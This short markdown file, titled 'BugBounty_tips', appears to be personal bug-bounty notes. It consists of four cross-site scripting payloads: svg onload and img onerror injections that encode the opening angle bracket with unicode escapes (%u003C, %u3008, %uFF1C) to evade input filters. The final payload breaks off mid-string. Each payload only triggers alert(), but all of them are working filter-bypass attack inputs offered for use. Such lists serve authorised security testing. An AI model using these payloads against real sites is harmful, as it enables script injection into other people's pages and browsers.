# BugBounty_tips

#Xss

%u003Csvg onload=alert(1)> \
%u3008svg onload=alert(2)> \
%uFF1Csvg onload=alert(3)> \
=<img%20src=x%20onerror=alert('Welcome,%20v \
